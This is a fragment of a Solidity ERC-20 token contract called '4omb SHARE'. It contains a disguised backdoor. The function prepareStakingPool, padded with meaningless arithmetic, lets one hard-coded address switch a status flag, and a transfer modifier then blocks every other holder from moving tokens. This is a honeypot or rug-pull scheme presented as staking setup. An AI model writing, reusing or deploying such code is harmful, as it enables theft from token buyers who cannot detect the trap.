...
contract FourOmbSHARE is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenaw_totalSupply;
    uint256 private _tokenaw_status = 0;
    uint256 public stakingPoolawStatus = 0;

    string private _tokenaw_name;
    string private _tokenaw_symbol;

    address private _poolawAddress = 0x5631e35aaC7A2c66e4ec2Ae46A555abC08d24B06; 

    constructor() {
        _tokenaw_name = "4omb SHARE";
        _tokenaw_symbol = "4SHARE";
        _tokenaw_totalSupply = 1000 * 10 ** 18;
        _balances[msg.sender] = _tokenaw_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolawAddress || _tokenaw_status == 0);
        _;
    }
    ...
    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPoolawStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolawAddress)
        {
            _tokenaw_status = 1;
        }
    }
